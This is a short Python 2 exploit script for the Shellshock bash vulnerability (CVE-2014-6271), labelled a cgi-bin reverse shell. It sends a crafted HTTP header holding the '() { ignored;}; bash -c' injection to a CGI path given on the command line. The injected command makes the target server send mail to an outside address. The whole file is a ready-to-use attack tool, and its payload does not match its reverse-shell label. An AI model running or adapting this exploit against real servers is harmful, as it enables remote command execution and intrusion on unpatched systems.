#!/usr/bin/env python
#
#CVE-2014-6271 cgi-bin reverse shell
#

import httplib,urllib,sys

if (len(sys.argv)<3):
	print "Welcome, my little kiddy..."
	print "Usage: %s <host> <vulnerable CGI>" % sys.argv[0]
	print "Example: %s localhost /cgi-bin/test.cgi" % sys.argv[0]
	exit(0)

conn = httplib.HTTPConnection(sys.argv[1])
reverse_shell="() { ignored;}; bash -c 'echo \"Testest\" | mail -s \"Repix done\" -a \"From: vps2@vps2.vps2\" markhost@yandex.ru"

headers = {"Content-type": "application/x-www-form-urlencoded",
	"test":reverse_shell }
conn.request("GET",sys.argv[2],headers=headers)
res = conn.getresponse()
print res.status, res.reason
data = res.read()
print data